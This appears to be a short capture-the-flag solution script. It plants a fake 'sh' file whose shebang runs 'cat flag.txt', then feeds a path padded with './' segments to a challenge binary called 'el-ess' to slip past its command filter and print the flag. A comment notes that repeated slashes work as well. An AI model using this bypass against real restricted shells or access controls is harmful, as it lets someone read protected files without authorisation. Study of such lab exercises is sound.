#!/bin/sh

echo '#!/bin/cat flag.txt' > sh
chmod +x sh
echo './././././././sh'  | SHELL=/bin/sh ./el-ess
rm sh

# sidenote:
#
# we don't have to use '.'  b/w consecutive '/' i.e
# `echo './////////////sh'` would work as good as the
# above solution ;-)
# see this: https://jvns.ca/blog/2017/02/08/weird-unix-things-cd/`
